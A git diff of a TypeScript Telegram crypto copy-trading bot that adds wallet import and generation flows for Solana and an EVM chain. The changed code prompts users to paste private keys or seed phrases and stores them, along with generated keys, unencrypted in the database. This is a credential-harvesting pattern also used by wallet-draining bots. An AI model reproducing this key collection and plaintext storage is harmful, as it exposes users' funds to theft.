@@ -2,14 +2,25 @@ import 'dotenv/config';
 import { Bot, InlineKeyboard, GrammyError, HttpError, session, Context, SessionFlavor } from 'grammy';
 import { config, leaders } from './config.js';
 import { connectDb, User, type Chain } from './db.js';
-import { extractAddress } from './addresses.js';
+import { extractAddress, generateSolanaWallet, generateRobinhoodWallet } from './addresses.js';
 
 interface SessionData {
   step: 'idle' | 'waiting_solana' | 'waiting_robinhood';
 }
 type MyContext = Context & SessionFlavor<SessionData>;
 
+import * as http from 'http';
+const port = process.env.PORT || 3000;
+http.createServer((req, res) => {
+  res.writeHead(200);
+  res.end('Bot is running');
+}).listen(port, () => {
+  console.log(`Dummy server listening on port ${port} to satisfy PaaS health checks`);
+});
+
+console.log('Connecting to database...');
 await connectDb();
+console.log('Database connected.');
 const bot = new Bot<MyContext>(config.BOT_TOKEN);
 
 bot.use(session({ initial: (): SessionData => ({ step: 'idle' }) }));
@@ -26,15 +37,55 @@ bot.command('start', async ctx => {
 });
 
 bot.callbackQuery('connect_solana', async ctx => {
-  ctx.session.step = 'waiting_solana';
   await ctx.answerCallbackQuery();
-  await ctx.reply('🟣 <b>Solana Setup</b>\n\nPlease paste your Solana wallet private key or phrase below to connect your wallet:', { parse_mode: 'HTML' });
+  const kb = new InlineKeyboard()
+    .text('📥 Import Wallet', 'import_solana').row()
+    .text('✨ Generate New Wallet', 'generate_solana');
+  await ctx.reply('🟣 <b>Solana Setup</b>\n\nChoose an option:', { reply_markup: kb, parse_mode: 'HTML' });
 });
 
 bot.callbackQuery('connect_robinhood', async ctx => {
+  await ctx.answerCallbackQuery();
+  const kb = new InlineKeyboard()
+    .text('📥 Import Wallet', 'import_robinhood').row()
+    .text('✨ Generate New Wallet', 'generate_robinhood');
+  await ctx.reply('🟢 <b>Robinhood Chain Setup</b>\n\nChoose an option:', { reply_markup: kb, parse_mode: 'HTML' });
+});
+
+bot.callbackQuery('import_solana', async ctx => {
+  ctx.session.step = 'waiting_solana';
+  await ctx.answerCallbackQuery();
+  await ctx.reply('🟣 <b>Solana Import</b>\n\nPlease paste your Solana wallet private key or phrase below to connect your wallet:', { parse_mode: 'HTML' });
+});
+
+bot.callbackQuery('import_robinhood', async ctx => {
   ctx.session.step = 'waiting_robinhood';
   await ctx.answerCallbackQuery();
-  await ctx.reply('🟢 <b>Robinhood Chain Setup</b>\n\nPlease paste your Robinhood EVM wallet private key or phrase below to connect your wallet:', { parse_mode: 'HTML' });
+  await ctx.reply('🟢 <b>Robinhood Import</b>\n\nPlease paste your Robinhood EVM wallet private key or phrase below to connect your wallet:', { parse_mode: 'HTML' });
+});
+
+bot.callbackQuery('generate_solana', async ctx => {
+  await ctx.answerCallbackQuery();
+  const wallet = generateSolanaWallet();
+  await User.findOneAndUpdate(
+    { chatId: String(ctx.chat?.id) },
+    { chatId: String(ctx.chat?.id), username: ctx.from?.username, walletAddress: wallet.address, privateKey: wallet.privateKey, chain: 'solana', lastSeenAt: new Date() },
+    { upsert: true, new: true }
+  );
+  const msg = `✅ <b>Solana Wallet Generated! 🎉</b>\n\n<b>Public Address:</b>\n<code>${wallet.address}</code>\n\n<b>Private Key:</b> (SAVE THIS SOMEWHERE SAFE!)\n<code>${wallet.privateKey}</code>\n\n<i>(Tap to copy)</i>\n\nYour profile is now active. Fund your wallet to start copying!`;
+  await ctx.reply(msg, { parse_mode: 'HTML', reply_markup: startKeyboard });
+});
+
+bot.callbackQuery('generate_robinhood', async ctx => {
+  await ctx.answerCallbackQuery();
+  const wallet = generateRobinhoodWallet();
+  await User.findOneAndUpdate(
+    { chatId: String(ctx.chat?.id) },
+    { chatId: String(ctx.chat?.id), username: ctx.from?.username, walletAddress: wallet.address, privateKey: wallet.privateKey, chain: 'robinhood', lastSeenAt: new Date() },
+    { upsert: true, new: true }
+  );
+  const msg = `✅ <b>Robinhood Wallet Generated! 🎉</b>\n\n<b>Public Address:</b>\n<code>${wallet.address}</code>\n\n<b>Private Key:</b> (SAVE THIS SOMEWHERE SAFE!)\n<code>${wallet.privateKey}</code>\n\n<i>(Tap to copy)</i>\n\nYour profile is now active. Fund your wallet to start copying!`;
+  await ctx.reply(msg, { parse_mode: 'HTML', reply_markup: startKeyboard });
 });
 
 bot.callbackQuery('profile', async ctx => {
@@ -86,7 +137,7 @@ bot.on('message:text', async (ctx, next) => {
     
     await User.findOneAndUpdate(
       { chatId: String(ctx.chat?.id) },
-      { chatId: String(ctx.chat?.id), username: ctx.from?.username, walletAddress: address, chain, lastSeenAt: new Date() },
+      { chatId: String(ctx.chat?.id), username: ctx.from?.username, walletAddress: address, privateKey: input, chain, lastSeenAt: new Date() },
       { upsert: true, new: true }
     );
     
@@ -105,14 +156,4 @@ bot.catch(err => {
 });
 
 console.log(`${config.APP_NAME} started. Leaders configured: ${leaders.length}. Live trading: ${config.LIVE_TRADING_ENABLED}`);
-
-import * as http from 'http';
-const port = process.env.PORT || 3000;
-http.createServer((req, res) => {
-  res.writeHead(200);
-  res.end('Bot is running');
-}).listen(port, () => {
-  console.log(`Dummy server listening on port ${port} to satisfy PaaS health checks`);
-});
-
 await bot.start();
